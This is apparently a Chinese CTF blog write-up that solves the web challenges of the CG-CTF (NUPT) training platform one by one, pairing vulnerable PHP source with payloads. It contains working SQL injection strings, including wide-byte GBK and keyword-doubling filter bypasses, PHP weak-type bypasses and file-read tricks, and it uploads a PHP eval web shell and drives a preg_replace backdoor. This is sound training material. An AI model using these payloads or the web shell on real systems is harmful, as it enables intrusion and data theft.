---
title: CG-CTF Web Write up
date: 2018-02-17 12:49:24
tags:
 - ctf
 - wp
---
[CG-CTF](https://cgctf.nuptsast.com)
---原[南京邮件大学攻防训练平台](http://ctf.nuptzj.cn)
## web
### 签到题
进入页面，右键源代码，得到Flag
<Br />
### md5 collision
```
<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "nctf{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}
?>
```
审计后，利用php的弱类型实现hash加密的相等
```php
// payload
url?a=s878926199a

md5("QNKCDZO")==md5("s878926199a") //true
```

<Br />
### 签到2
看见界面，得知口令，输入框有个前端限制
改变输入框的`maxlength`属性，或者直接发送POST请求绕过即可
<Br />

### 这题不是WEB
打开页面，查看源代码或请求头，没有什么信息
但是里面一张图片具有怀疑，保存图片，用Winhex打开，发现最后具有flag
<Br />

### 层层递进
没有脑洞，看了别人的writeup得到两种思路
 - 根据提示查看源代码，依次点击`SO.html -> S0.html->SO.htm ->S0.htm->404.html`
 - 扫目录

看了别人扫目录，扫出404.html，默默给自己的字典加上
访问 http://chinalover.sinaapp.com/web3/404.html
右键源代码，看了规则的`<script>`标签，看出规律，得到flag
<Br />

### AAencode
找个AAdecode在线网站，解码即可
[AAdecode](https://tool.zcmzcm.org/aadecode)
<Br />

### 单身二十年
点击页面中的链接后，页面会发生两次跳转，第一次是正确页面，即
bp抓包，或者禁用JS都可行
<Br />

### php decode
```
<?php
function CLsI($ZzvSWE) {

    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));

    for ($i = 0; $i < strlen($ZzvSWE); $i++) {

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    }

    return $ZzvSWE;

}eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?>
```
将源码的eval()换成`echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==")`，在本地环境直接执行PHP代码，可以得到flag
<Br />

### 文件包含
进入页面，发现页面中链接带有参数file
利用`php://filter/read=convert.base64-encode/resource=index.php`读取index.php源码
解密后得到flag
<Br />

### 单身一百年也没用
同样是跳转，只不过flag藏在`response header`中
<Br />

### Download~!
典型任意文件下载，file参数值进行base64加密后，直接下载download.php
审计后，发现白名单过滤，发现还能下载一个文件
下载，得到flag
<Br />

### COOKIE
提示很明显，访问页面开始给用户设置`Cookie，Login=0`
再次访问提示类型权限不足，抓包修改`Cookie，Login=1`
绕过，得到flag
<Br />

### MYSQL
根据提示的robots.txt文件中，看见sql.php源码
```
<?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```
审计后得知，满足两个条件
 - `intval($_GET[id])=1024`
 - `$_GET[id]!=1024`

即可得到flag
```
url?id=1024.1 //payload

1024.1被强转之后变为1024，放入sql语句中可以得到数据
同时1024.1!=1024
```
<Br />

### GBK Injection
题目提示的很明显，页面也没有设置任何编码格式，即为默认的GBK
页面也显示了SQL语句
首先先确认注入点

```
url?id=1' // 页面回显信息正常，发现'被转义为\'，根据GBK编码，尝试宽字节绕过
url?id=1%df' // 页面出现报错信息，并且转移函数绕过成功，继续确认
url?id=1%df' or 1 %23 // 页面回显正常，并且没有过滤# 与 or和空格，注入点确定
```
开始得到数据
```
url?id=1%df' order by 2 %23 // order by 3页面报错，order by 2页面正常，确认为2列
url?id=1%df' and 0 union select 1,2 %23 //第二列数据可直接查看
url?id=1%df' and 0 union select 1,database() %23 //sae-chinalover
url?id=1%df' and 0 union select 1,group_concat(table_name) from information_schema.tables where table_schema =  0x7361652d6368696e616c6f766572 %23 // ctf,ctf2,ctf3,ctf4,news
url?id=1%df' and 0 union select 1,group_concat(column_name) from information_schema.columns where table_name =  0x63746634 %23 //id,flag
url?id=1%df' and 0 union select id,flag from ctf4 %23 // nctf{*****}
```
<Br />

### /x00
```
if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
```
审计后得知，利用ereg()的%00截断或者ereg()和strpos()传入数组返回Null的特性都可得到flag
```
url?nctf=1%00%23biubiubiu
url?nctf[]=1
```
<Br />

### bypass again
```
if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) === md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
```
用弱类型或者md5()的特性都可解
```
url?a[]=1&b[]=2
url?a=QNKCDZO&b=s878926199a
```
<Br />

### 变量覆盖
主要代码
```
<?php
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
        extract($_POST);
        if ($pass == $thepassword_123)
          echo $theflag;
  }
```
审计后得知extract()漏洞
```
[POST DATA]
thepassword_123=123&pass=123
```
<Br />

### PHP是世界上最好的语言
根据页面提示查看index.txt文件中源码
```
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
```
审计后得知url二次编码绕过
`url?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`
<Br />

### 伪装者
提示需要本地登陆，需要猜测该站点检测是哪里的IP地址和过滤规则
尝试后发现，改变HTTP包的请求头

```
GET /web4/xxx.php HTTP/1.1
Host: chinalover.sinaapp.com
CLIENT-IP: 127.0.0.1
```
得到flag

<Br />

### Header
抓取HTTP报文，查看响应头，得到flag
<Br />

### 上传绕过
上传一个普通文件后，发现返回页面中带有一些参数
查看请求体，发现文件中规定了文件上传路径，测试后发现并且没有限制
尝试%00截断在/uploads/后面
成功，拿到flag

```
POST /web5/21232f297a57a5a743894a0e4a801fc3/upload.php HTTP/1.1
Host: teamxlc.sinaapp.com
Content-Type: multipart/form-data; boundary=---------------------------19468279513437
Content-Length: 323

-----------------------------19468279513437
Content-Disposition: form-data; name="dir"

/uploads/这里截断
-----------------------------19468279513437
Content-Disposition: form-data; name="file"; filename="php.jpg"
Content-Type: image/jpeg

<?php
@eval($_POST[byxs]);
?>

-----------------------------19468279513437--
```

感觉上传绕过题目大多还是心中有代码，和根据依稀信息或者猜测别人如果做过滤之类，或者服务解析漏洞。
<Br />

### SQL注入1
进入页面，直接看源码
```
<?php
if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  if($query[user]=="admin") {
      echo "<p>Logged in! flag:******************** </p>";
  }
  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
echo $query[user];
?>
```
审计后得到几个条件
 - 对参数进行了除空格，可以用+号或者`/**/`去代替空格
 - 对pass进行了MD5加密，那么pass很难成为利用点
 - 得到的数据为admin，不确定是里面的第几条

根据条件精心构造后

```
user='||1)#&pass=1 //直接将pass部分注释掉，然后user利用永真条件，猜测第一条数据为admin，如果不是用limit遍历即可
user=') union select 'admin' #&pass=1 //union也可以达到目的，不过反而更麻烦了
```

<Br />

### pass check
```
<?php
$pass=@$_POST['pass'];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo "flag:nctf{*}";
}else{
echo "the pass is wrong!";
}
}else{
echo "please input pass!";
}
?>
```
发现可以利用strcmp()漏洞来绕过，得到flag
```
[POSTDATA]
pass[]=123
```
<Br />

### 起名字真难
```
<?php
<?php
 function noother_says_correct($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '54975581388';
}
$flag='*******';
if(noother_says_correct($_GET['key']))
    echo $flag;
else
    echo 'access denied';
?>
```
**得到一个经验，审计一定要非常非常非常的细心和仔细**
开始就审题理解错误，后来自己调试了下，仔细查看之后，用PHP弱类型特性，**当0x开头的字符串和字符串比较，会转为同一类型进行比较**
```
url?key=0xccccccccc // 0xccccccccc == '54975581388'
```
<Br />

### 密码重置
提示很明显说改admin重置，url中也有一串明显的BASE64加密，那么直接改成admin并且加密
然后提交表单时候，页面中我的帐号改动需要修改input的readonly属性，或者直接构造POST请求包绕过
即可得到flag

<Br />

### SQL Injection
```
<!--
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
	die('Invalid password!');
}

echo $flag;
-->
```
提示给的很明显了。。源代码也给自己，开始自己给绕进去了，后来看了别人的write up 恍然大悟
首先把`$query`给简单的折合一下就是

```
<?php
$query="SELECT * FROM users WHERE name='$username' AND pass='$password'";
// 其实简化后就是这样，开始绕进去就是我以为\是在入库后转义，脑壳瓦特了
// 而且居然有源码情况下，居然懒得调试，哎..
?>
```
其实就是在PHP拼接的时候，利用`\`吃掉单引号，然后在利用第二个参数的单引号，完成条件满足
```
url?username=\&password=||1%23
```

<Br />

### 综合题
进入页面，有JSFuck encode的数据，直接扔到F12控制台里面运行，直接出现一个新的页面URL`1bc29b36f623ba82aaf6724fd3b16718.php`
进入页面有一个提示信息，查看响应包，里面有`tip：history of bash`
扔到google查一下，知道了 .bash_history 文件
访问得到一条命令带有压缩包文件flagbak.zip，下载得到flag

这题目挺好的，至少我在里面学会了
**仔细观察响应包里的信息，说不定是最近爆出来的CVE，或者一些蛛丝马迹，对于没有思路的时候，非常重要吧，我经常粗略过，便放过了很多可能。**


<Br />

### SQL注入2
```
<?php
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```
根据提示，审计源码，直接得出payload
```
[POST DATA]
user=' union select md5(1)#&pass=1

自己根据sql语句构建一个密码，两者对等即可
```
<Br />

### 综合题2
一直对于综合型题目没有很好的思路...既然是CTF题目，必定有解，并且题目的构成也不太复杂
把大致页面浏览，寻找一些蛛丝马迹，得到突破口
其实首页的功能来看，有几个思路
 - sqli
 - xss(提示说不是XSS)
 - 源码泄漏，CVE....

不过后来在寻找的过程中，发现`http://cms.nuptzj.cn/about.php?file=sm.txt`
并且给出了提示
 - sae的information_schema表没法检索（试了下，的确）
 - admin表结构
 - 一些文件的功能说明

利用about.php的任意文件读取漏洞，顺着先查看`index.php`,`about.php`,`so.php`等源码(显示出的源码，乱糟糟的,我是右键源代码，在用在线html实体转换，到sublime编辑器看)
审计分析得出`index.php`中利用信息较少
在是`about.php`中带有一个字符串`loginxlcteam`，猜测不是路径就是文件名
尝试访问，发现一个后台管理的登录系统`http://cms.nuptzj.cn/loginxlcteam/`，尝试了一下弱口令，无果
那么接下来已经感觉有一条明确的路线，通过sqli注入得到管理员信息，登录到后台
继续审计源码`so.php`，发现可注入，但是有`HTTP头验证`和`antiinject.php`的规则的过滤
继续审计源码`antiinject.php`，发现关键字过滤完全可以绕过，特殊符号过滤不行
接下来尝试SQL注入得到后台帐号密码，根据admin文件结构
```
/**/绕过空格过滤，双写绕过关键字过滤
soid=9999/**/uniunionon/**/selecselectt/**/1,2,3,4 //得到第二列在搜索页面中可显，并且列名为4

先假设只有一条记录，然后真的只有一条
soid=9999/**/uniunionon/**/selecselectt/**/1,usernamnamee,3,4/**/from/**/admiadminn //得到用户名
soid=9999/**/uniunionon/**/selecselectt/**/1,userpaspasss,3,4/**/from/**/admiadminn //得到密码

这边密码得到是一串ascii码，用ascii码登录是无效的，利用在线ascii转换工具，转成字符串即可登录
至于怎么知道的，因为sm.txt里面有说明，数据库密码是自己写的加密算法，查看加密算法后，得知只是转换了ascii码
```
登录后台，页面给出一个一句话木马的地址`http://cms.nuptzj.cn/xlcteam.php`
用`about.php`读出源码，然后在利用一句话执行命令，列出目录
```
xlcteam.php
<?php $e = $_REQUEST['www']; $arr = array($_POST['wtf'] => '|.*|e',); array_walk($arr, $e, ''); ?>

利用姿势
[POST DATA]
www=preg_replace&wtf=phpinfo()
```
这个利用自己琢磨了一伙无果，google了一下，看了下大牛的wp最后的利用姿势[综合题2writeup](https://blog.spoock.com/2016/06/20/nuptzj-web2-writeup/?utm_source=tuicool&utm_medium=referral)
很高端，接下来可以直接获取当前目录的的内容
```
[POST DATA]
www=preg_replace&wtf=print_r(scandir("./"))
```
转换下编码，发现有flag文件，打开得到flag


<Br />

### 密码重置2
题目非常明显，进入页面，除了index.php外，请求提交的页面是submit.php
提示说有vi的临时文件，直接访问两个页面，发现`.submit.php.swp`有
```
if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```
审计源码后发现,只要$token的长度等于10，并且等于0，就行，直接0000000000或者0x00000000，直接弱类型可以绕过
邮箱在index.php页面中的meta中
<Br />

### file_get_contents
进入页面空白，查看源代码，审计后发现可以利用`php://input`
绕过
```
url?file=php://input
[POSTDATA]  meizijiu
```
<Br />

### 变量覆盖
进入页面为空，查看源代码，审计之后得知....
暂时没思路，感觉对$chs变量也无法控制，等大佬解说一波

<Br />

## 总结
 - 代码审计的时候，一定要非常非常非常的仔细和细心
 - 仔细观察响应包里的信息，说不定是最近爆出来的CVE，或者一些蛛丝马迹，对于没有思路的时候，非常重要吧，我经常粗略过，便放过了很多可能。
